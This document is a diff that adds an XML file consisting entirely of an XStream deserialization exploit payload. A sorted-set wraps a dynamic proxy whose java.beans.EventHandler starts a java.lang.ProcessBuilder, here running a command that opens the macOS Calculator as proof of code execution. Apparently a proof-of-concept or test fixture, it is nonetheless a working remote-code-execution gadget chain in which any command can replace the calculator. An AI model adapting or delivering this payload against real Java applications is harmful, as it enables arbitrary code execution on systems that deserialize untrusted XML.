@@ -1,0 +1,16 @@
+    <sorted-set>
+        <string>foo</string>
+        <dynamic-proxy>
+            <interface>java.lang.Comparable</interface>
+            <handler class="java.beans.EventHandler">
+                <target
+                    class="java.lang.ProcessBuilder">
+                    <command>
+                        <string>open</string>
+                        <string>/Applications/Calculator.app</string>
+                    </command>
+                </target>
+                <action>start</action>
+            </handler>
+        </dynamic-proxy>
+    </sorted-set>
